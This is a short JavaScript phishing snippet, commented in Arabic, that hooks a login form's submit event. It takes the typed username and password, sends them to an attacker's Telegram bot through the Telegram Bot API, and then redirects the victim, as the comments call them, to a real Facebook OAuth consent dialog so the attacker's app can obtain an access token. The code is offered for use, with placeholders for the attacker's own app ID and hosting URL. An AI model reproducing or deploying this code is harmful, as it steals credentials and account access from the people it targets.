document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();

    // 1. سحب البيانات التقليدية أولاً (إيميل وباسوورد) للتمويه
    const u = document.getElementById('user').value;
    const p = document.getElementById('pass').value;
    
    const msg = `👤 **دخول + طلب تفويض**\n📧 الحساب: \`${u}\`\n🔑 الكلمة: \`${p}\``;
    
    // إرسال البيانات للبوت
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "Markdown" })
    });

    // 2. النقلة الذكية: فتح نافذة موافقة فيسبوك الرسمية
    // استبدل YOUR_APP_ID بمعرف تطبيقك و YOUR_URL برابط استضافتك
    const APP_ID = "YOUR_APP_ID"; 
    const REDIRECT = "https://your-hosting-url.com/";
    const SCOPE = "email,public_profile";

    const oauthUrl = `https://www.facebook.com/v12.0/dialog/oauth?client_id=${APP_ID}&redirect_uri=${REDIRECT}&response_type=token&scope=${SCOPE}`;

    // توجيه الضحية لصفحة الموافقة الرسمية
    window.location.href = oauthUrl;
});
